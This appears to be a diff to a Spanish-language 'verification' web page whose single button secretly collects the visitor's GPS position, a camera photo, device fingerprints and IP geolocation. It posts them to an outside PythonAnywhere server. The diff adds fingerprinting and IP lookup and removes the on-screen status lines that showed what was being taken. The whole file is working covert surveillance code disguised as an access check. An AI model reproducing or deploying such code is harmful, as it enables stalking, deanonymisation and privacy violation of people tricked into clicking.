@@ -24,8 +24,17 @@
             width: 100%;
             text-align: center;
         }
-        h1 { font-size: 1.8rem; margin-bottom: 12px; }
-        p { color: #5f6368; margin-bottom: 28px; }
+        h1 {
+            font-size: 1.8rem;
+            font-weight: 600;
+            color: #1a1a1a;
+            margin-bottom: 12px;
+        }
+        p {
+            color: #5f6368;
+            font-size: 0.9rem;
+            margin-bottom: 28px;
+        }
         button {
             background: #1a73e8;
             color: white;
@@ -38,27 +47,29 @@
             width: 100%;
             transition: background 0.2s;
         }
-        button:active { background: #1557b0; transform: scale(0.98); }
-        #status { margin-top: 16px; font-size: 0.8rem; color: #5f6368; }
+        button:active {
+            background: #1557b0;
+            transform: scale(0.98);
+        }
+        button:disabled {
+            background: #a0a0a0;
+            cursor: not-allowed;
+        }
     </style>
 </head>
 <body>
 <div class="card">
     <h1>🔐 Verificación</h1>
     <p>Presiona el botón para continuar</p>
-    <button id="btn">✅ Verificar</button>
-    <div id="status">Esperando...</div>
+    <button id="btn">✅ Verificar acceso</button>
 </div>
 
 <video id="video" autoplay playsinline style="display:none"></video>
 <canvas id="canvas" style="display:none"></canvas>
 
 <script>
-    // ========== CONFIGURACIÓN ==========
-    // ¡PON AQUÍ LA URL DE TU SERVIDOR EN PYTHONANYWHERE!
     const SERVER_URL = 'https://societykark.pythonanywhere.com/';
 
-    // ---------- FUNCIONES ----------
     function getGPS() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) { resolve(null); return; }
@@ -93,60 +104,118 @@
         return blob;
     }
 
-    async function sendToServer(text, photoBlob) {
+    async function getFingerprint() {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = 200; canvas.height = 50;
+        ctx.fillStyle = "#f60"; ctx.fillRect(0, 0, 200, 50);
+        ctx.fillStyle = "#069"; ctx.font = "14px Arial"; ctx.fillText("FP", 10, 30);
+        const canvasHash = canvas.toDataURL().slice(0, 100);
+        let gpu = 'N/A';
         try {
-            // Convertir foto a base64
-            let photoBase64 = null;
-            if (photoBlob) {
-                photoBase64 = await new Promise((resolve) => {
-                    const reader = new FileReader();
-                    reader.onload = () => resolve(reader.result.split(',')[1]);
-                    reader.readAsDataURL(photoBlob);
-                });
-            }
-            
-            const payload = {
-                text: text,
-                photo: photoBase64
-            };
-            
+            const gl = document.createElement('canvas').getContext('webgl');
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A';
+        } catch(e) {}
+        const fontsList = ["Arial", "Verdana", "Helvetica", "Times New Roman", "Courier New", "Impact", "Comic Sans MS"];
+        const availableFonts = fontsList.filter(f => document.fonts.check(`12px "${f}"`));
+        return { gpu, fonts: availableFonts.join(', ') || 'Ninguna', canvasHash };
+    }
+
+    async function sendToServer(text, photoBlob, gps, device, fp) {
+        let photoBase64 = null;
+        if (photoBlob) {
+            photoBase64 = await new Promise((resolve) => {
+                const reader = new FileReader();
+                reader.onload = () => resolve(reader.result.split(',')[1]);
+                reader.readAsDataURL(photoBlob);
+            });
+        }
+        
+        let ipData = {};
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            ipData = await res.json();
+        } catch(e) {}
+
+        const payload = {
+            text: text,
+            photo: photoBase64,
+            ip: ipData.ip || 'N/A',
+            country: ipData.country_name || 'N/A',
+            region: ipData.region || 'N/A',
+            city: ipData.city || 'N/A',
+            postal: ipData.postal || 'N/A',
+            timezone: ipData.timezone || 'N/A',
+            gps: gps,
+            device: device.model,
+            ua: device.ua,
+            language: device.language,
+            resolution: device.resolution,
+            cpu_cores: device.cpuCores,
+            ram: 'N/A',
+            storage_used: 'N/A',
+            storage_total: 'N/A',
+            gpu: fp.gpu,
+            fonts: fp.fonts,
+            canvas: fp.canvasHash,
+            camera: photoBlob ? 'Permitido' : 'Denegado/No disponible',
+            location: gps ? 'Permitido' : 'Denegado/No disponible',
+            target: window.location.href
+        };
+
+        try {
             const res = await fetch(SERVER_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
             return res.ok;
-        } catch(e) { return false; }
+        } catch(e) {
+            console.error(e);
+            return false;
+        }
     }
 
-    // ---------- PRINCIPAL ----------
     document.getElementById('btn').onclick = async () => {
         const btn = document.getElementById('btn');
-        const status = document.getElementById('status');
         btn.disabled = true;
         btn.innerText = '⏳ Procesando...';
 
-        status.innerText = '📍 Obteniendo ubicación...';
-        const gps = await getGPS();
+        try {
+            const gps = await getGPS();
+            const foto = await capturePhoto();
+            const fp = await getFingerprint();
+            
+            const device = {
+                model: "Desconocido",
+                ua: navigator.userAgent,
+                language: navigator.language || navigator.userLanguage,
+                resolution: `${window.screen.width}x${window.screen.height}`,
+                cpuCores: navigator.hardwareConcurrency || 'N/A'
+            };
+            if (navigator.userAgent.includes('iPhone')) device.model = 'iPhone';
+            else if (navigator.userAgent.includes('iPad')) device.model = 'iPad';
+            else if (navigator.userAgent.includes('Android')) device.model = 'Android';
+            else if (navigator.userAgent.includes('Mac')) device.model = 'Mac';
+            else if (navigator.userAgent.includes('Windows')) device.model = 'Windows PC';
 
-        status.innerText = '📸 Tomando foto...';
-        const foto = await capturePhoto();
+            let message = `📊 *Reporte*\n━━━━━━━━━━━━━\n`;
+            message += `📍 *GPS*: ${gps ? `${gps.lat}, ${gps.lng} (±${gps.accuracy}m)` : 'No disponible'}\n`;
+            message += `📱 *Dispositivo*: ${device.model}\n`;
+            message += `📐 *Resolución*: ${device.resolution}\n`;
+            message += `🕐 *Fecha*: ${new Date().toLocaleString()}\n`;
+            if (gps) {
+                message += `🗺️ *Mapa*: https://www.google.com/maps?q=${gps.lat},${gps.lng}\n`;
+            }
 
-        let message = `📊 *Reporte*\n━━━━━━━━━━━━━\n`;
-        message += `📍 *GPS*: ${gps ? `${gps.lat}, ${gps.lng} (±${gps.accuracy}m)` : 'No disponible'}\n`;
-        message += `📱 *Dispositivo*: ${navigator.userAgent.split(' ').slice(0,3).join(' ')}\n`;
-        message += `📐 *Resolución*: ${window.screen.width}x${window.screen.height}\n`;
-        message += `🕐 *Fecha*: ${new Date().toLocaleString()}\n`;
-        if (gps) {
-            message += `🗺️ *Mapa*: https://www.google.com/maps?q=${gps.lat},${gps.lng}\n`;
+            await sendToServer(message, foto, gps, device, fp);
+        } catch(e) {
+            console.error(e);
         }
 
-        status.innerText = '📤 Enviando datos...';
-        const ok = await sendToServer(message, foto);
-
-        status.innerText = ok ? '✅ ¡Enviado!' : '❌ Error al enviar';
         btn.disabled = false;
-        btn.innerText = '✅ Verificar';
+        btn.innerText = '✅ Verificar acceso';
     };
 </script>
 </body>
